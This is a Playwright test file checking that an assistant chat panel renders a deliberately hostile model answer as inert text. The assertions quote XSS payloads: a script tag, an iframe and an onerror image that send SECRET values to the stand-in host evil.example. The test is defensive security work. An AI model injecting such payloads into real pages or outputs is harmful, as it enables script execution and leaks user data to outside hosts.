import { expect, test } from '@playwright/test'
import { demoOwnerState } from './demo-owner.ts'

// Render safety (assistant brief §3.2, B6). In development the demo model
// answers "#hostile" with what a hostile model may write: remote images
// (inline, by reference, protocol-relative, inside a link, autolinked) whose
// URLs carry data, raw <img onerror>, <script>, <iframe> and <svg onload>,
// javascript:, data: and vbscript: links, Liquid holding HTML, a 24-column
// table and lines thousands of characters long. The panel must fetch none
// of the images, run no script, open no dialog, make no dangerous link and
// not widen a 320 px screen. Needs a server seeded with `reputecast seed`.
test.use({ storageState: demoOwnerState })

test('a hostile answer renders as text and links, and fetches nothing', async ({ page, isMobile }) => {
  test.skip(isMobile, 'the desktop run checks 1440 and then 320 px')
  test.setTimeout(120_000)
  const fetched: string[] = []
  const dialogs: string[] = []
  const errors: string[] = []
  page.on('request', (r) => {
    if (r.url().includes('evil.example')) fetched.push(r.url())
  })
  await page.route(/evil\.example/, (route) => route.abort())
  page.on('dialog', (d) => {
    dialogs.push(d.message())
    void d.dismiss()
  })
  page.on('pageerror', (e) => errors.push(e.message))

  await page.goto('/w/acme-newsletter')
  await expect(page.getByRole('heading', { level: 1 }).first()).toHaveText(/Overview/, { timeout: 30_000 })
  await page.getByRole('button', { name: 'Assistant', exact: true }).click()
  const composer = page.getByRole('textbox', { name: 'Message the assistant' })
  await composer.fill('Show me everything #hostile')
  await composer.press('Enter')
  const panel = page.locator('#assistant')
  await expect(panel.getByText('End of the hostile sample.')).toBeVisible({ timeout: 60_000 })
  await expect(panel.getByRole('button', { name: 'Send' })).toBeVisible({ timeout: 30_000 })
  const answer = panel.locator('article.asst-msg.ai').last()

  // Nothing active was made from the answer.
  await expect(answer.locator('img, script, iframe, object, embed, video, audio, svg:not([aria-hidden="true"])')).toHaveCount(0)
  await expect(answer).toContainText(`<script>alert('script'); window.__demoXSS = 1</script>`)
  await expect(answer).toContainText(`<iframe src="https://evil.example/frame?d=SECRET-FRAME"></iframe>`)
  await expect(answer).toContainText(`{{ "<img src=https://evil.example/liquid.png?d=SECRET-LIQUID onerror=alert('liquid')>" }}`)

  // Images are links that name their domain; one inside a link is text.
  await expect(answer.getByRole('link', { name: /^Image: chart \(evil\.example\)/ })).toHaveAttribute('referrerpolicy', 'no-referrer')
  await expect(answer.getByRole('link', { name: /^Image: logo \(evil\.example\)/ })).toBeVisible()
  await expect(answer.getByRole('link', { name: /^Image: badge \(evil\.example\) \(example\.com\)/ })).toHaveAttribute('href', 'https://example.com/docs')

  // Every link is http(s) or the app's own, opens a new tab without a referrer.
  const links = await answer.locator('a').evaluateAll((as) => as.map((a) => ({ href: a.getAttribute('href') ?? '', rel: a.getAttribute('rel') ?? '', target: a.getAttribute('target') ?? '' })))
  expect(links.length).toBeGreaterThan(5)
  for (const l of links) {
    expect(l.href).toMatch(/^(https?:)?\/\//)
    expect(l.rel).toContain('noreferrer')
    expect(l.target).toBe('_blank')
  }
  for (const name of ['javascript', 'mixed case', 'entity', 'data', 'vbscript']) {
    await expect(answer.getByRole('link', { name, exact: true })).toHaveCount(0)
    await answer.getByText(name, { exact: true }).click()
  }
  await answer.getByText('bold').hover()

  // A 320 px screen: the panel is the whole screen and nothing widens it;
  // the table and the code scroll in their own regions.
  await page.setViewportSize({ width: 320, height: 640 })
  await expect(panel).toBeVisible()
  // The full-screen panel slides in: measure where it ends.
  // In-page code is a string: the specs compile without the DOM's types.
  await page.evaluate(`Promise.all(document.querySelector('#assistant').getAnimations({ subtree: true }).map((a) => a.finished))`)
  const wide = await page.evaluate(`(() => {
    const w = window.innerWidth
    const out = []
    if (document.documentElement.scrollWidth > w) out.push('page ' + document.documentElement.scrollWidth)
    for (const el of document.querySelectorAll('#assistant *')) {
      const r = el.getBoundingClientRect()
      if (r.width === 0 || r.right <= w + 1 || el.closest('.asst-table, .asst-code pre')) continue
      out.push(el.tagName.toLowerCase() + '.' + el.className + ' ' + Math.round(r.right))
    }
    return out
  })()`)
  expect(wide).toEqual([])

  expect(fetched).toEqual([])
  expect(dialogs).toEqual([])
  expect(errors).toEqual([])
  expect(await page.evaluate('window.__demoXSS')).toBeUndefined()
})
